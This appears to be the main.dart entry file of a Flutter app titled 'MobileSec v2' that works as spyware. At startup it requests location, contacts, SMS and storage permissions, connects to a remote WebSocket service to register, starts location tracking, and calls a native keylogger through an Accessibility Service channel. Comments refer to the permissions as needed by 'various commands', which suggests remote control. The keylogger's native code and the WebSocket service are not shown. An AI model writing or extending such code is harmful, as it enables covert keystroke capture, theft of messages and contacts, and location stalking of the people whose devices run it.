import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_web_plugins/url_strategy.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/foundation.dart'; // For kDebugMode

import '/flutter_flow/flutter_flow_theme.dart';
import '/flutter_flow/flutter_flow_util.dart';
import '/flutter_flow/nav/nav.dart';
import 'index.dart'; // Assuming this contains your FlutterFlow page imports

import 'pages/find_friend_by_phone/find_friend_by_phone_widget.dart';

import 'location_service.dart'; // Your existing LocationService
import 'websocket_service.dart'; // Import the WebSocket Service

// Keylogger MethodChannel
const MethodChannel _keyloggerPlatform = MethodChannel(
  'com.mycompany.mobilesecv2/keylogger',
);

void main() async {
  // Ensure Flutter bindings are initialized.
  WidgetsFlutterBinding.ensureInitialized();
  GoRouter.optionURLReflectsImperativeAPIs = true;
  usePathUrlStrategy(); // Recommended for web routing consistency

  // Initialize FlutterFlow theme.
  await FlutterFlowTheme.initialize();

  // Request necessary permissions upfront.
  await _requestCorePermissions();

  // Connect WebSocket AFTER permissions (especially if userId depends on device info requiring permissions)
  WebSocketService().connectAndRegister();

  // Run the Flutter app.
  runApp(MyApp());
}

// Function to request permissions needed by various commands
Future<void> _requestCorePermissions() async {
  if (kDebugMode) {
    print("Requesting core permissions...");
  }
  // Define permissions to request
  List<Permission> permissionsToRequest = [
    Permission.location,
    Permission.contacts, // For READ_CONTACTS and GET_ACCOUNTS
    Permission.sms,      // For READ_SMS
    Permission.storage,  // For READ/WRITE_EXTERNAL_STORAGE (behavior varies by Android version)
    // Permission.phone, // Less common, but sometimes needed indirectly
  ];

   // Add background location only if LocationService explicitly requires it
   // and ACCESS_BACKGROUND_LOCATION is in AndroidManifest.xml.
   // Be very careful with background location requests due to policy restrictions.
   // if (LocationService.needsBackground) {
   //   permissionsToRequest.add(Permission.locationAlways);
   // }


  // Request permissions
  Map<Permission, PermissionStatus> statuses = await permissionsToRequest.request();

  // Log permission statuses
  statuses.forEach((permission, status) {
    if (kDebugMode) {
      print("Permission ${permission.toString().split('.').last}: $status");
    }
    // Optional: Handle permanently denied permissions here (e.g., guide user to settings)
    if (status == PermissionStatus.permanentlyDenied) {
       if (kDebugMode) {
         print("Permission ${permission.toString().split('.').last} permanently denied. User must enable in settings.");
       }
       // Consider showing a dialog prompting the user to go to settings:
       // openAppSettings();
    }
  });

   if (kDebugMode) {
     print("Core permission request phase complete.");
     // Note: Accessibility Service permission for keylogger needs manual user enablement via Settings.
     print("Reminder: Keylogger requires manual Accessibility Service enablement.");
   }
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();

  static _MyAppState of(BuildContext context) =>
      context.findAncestorStateOfType<_MyAppState>()!;
}

class _MyAppState extends State<MyApp> {
  ThemeMode _themeMode = FlutterFlowTheme.themeMode;
  late AppStateNotifier _appStateNotifier;
  late GoRouter _router;

  @override
  void initState() {
    super.initState();
    if (kDebugMode) {
      print("MyApp initState: Initializing...");
    }

    _appStateNotifier = AppStateNotifier.instance;
    _router = createRouter(_appStateNotifier); // Ensure createRouter is defined elsewhere (FlutterFlow default)

    // Attempt to start keylogger (will check for accessibility permission natively)
    startKeyLogger();

    // Check location permission status AFTER initState frame build
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      if (kDebugMode) {
        print("MyApp initState: PostFrameCallback executing...");
      }
      // Check if location permission was granted during startup request
      if (await Permission.location.isGranted) {
        if (kDebugMode) {
          print("📍 Location permission granted. Starting tracking.");
        }
        // Ensure LocationService().startTracking() handles potential errors
        try {
           LocationService().startTracking();
        } catch (e) {
            if (kDebugMode) {
               print("🚨 Error starting location tracking: $e");
            }
        }
      } else {
        if (kDebugMode) {
          print("⛔️ Location permission not granted at initState check. Tracking not started.");
        }
      }

      // WebSocket is already started in main(), no need to start again here.
      // WebSocketService().connectAndRegister(); // Redundant
    });

     if (kDebugMode) {
       print("MyApp initState: Initialization complete.");
     }
  }

  @override
  void dispose() {
     if (kDebugMode) {
       print("MyApp dispose: Cleaning up resources...");
     }
    // Dispose WebSocket connection when the main app widget is disposed
    WebSocketService().dispose();

    // Consider stopping location tracking if appropriate
    // LocationService().stopTracking();

    super.dispose();
     if (kDebugMode) {
       print("MyApp dispose: Cleanup complete.");
     }
  }

  // Invokes the native method to request starting the keylogger.
  Future<void> startKeyLogger() async {
    if (kDebugMode) {
      print("Attempting to invoke native startKeyLogger...");
    }
    try {
      // This just tells the native side to check/ensure the service runs if permission is granted.
      // It doesn't actually grant the Accessibility permission itself.
      final result = await _keyloggerPlatform.invokeMethod('startKeyLogger');
       if (kDebugMode) {
         print("✅ Native startKeyLogger invoked successfully. Result: $result");
       }
    } on PlatformException catch (e) {
      // This usually means the platform method failed (e.g., permission denied reported back)
      if (kDebugMode) {
        print("❌ Failed to invoke native startKeyLogger: ${e.code} - ${e.message}");
      }
    } catch (e) {
       if (kDebugMode) {
         print("❌ Unexpected error invoking native startKeyLogger: $e");
       }
    }
  }

  // --- FlutterFlow Theme and Routing Helpers (Keep as generated by FlutterFlow) ---
  void setThemeMode(ThemeMode mode) => safeSetState(() {
    _themeMode = mode;
    FlutterFlowTheme.saveThemeMode(mode);
  });

  String getRoute([RouteMatch? routeMatch]) {
    final RouteMatch lastMatch = routeMatch ?? _router.routerDelegate.currentConfiguration.last;
    final RouteMatchList matchList = lastMatch is ImperativeRouteMatch
        ? lastMatch.matches
        : _router.routerDelegate.currentConfiguration;
    return matchList.uri.toString();
  }

  // Helper to get the stack of route paths. Used by flutter_flow_util.dart
  List<String> getRouteStack() {
    // Ensure router is initialized before accessing delegate
    if (_router.routerDelegate.currentConfiguration.matches.isEmpty) {
      return [];
    }
    return _router.routerDelegate.currentConfiguration.matches
        .map((e) => getRoute(e)) // Use the getRoute helper
        .toList();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp.router(
      title: 'MobileSec v2', // Your App Title
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      supportedLocales: const [Locale('en', '')], // Add other locales if needed
      theme: ThemeData(brightness: Brightness.light, useMaterial3: false),
      darkTheme: ThemeData(brightness: Brightness.dark, useMaterial3: false),
      themeMode: _themeMode,
      routerConfig: _router, // Use the GoRouter instance
      debugShowCheckedModeBanner: false, // Set to false for release builds
    );
  }
}

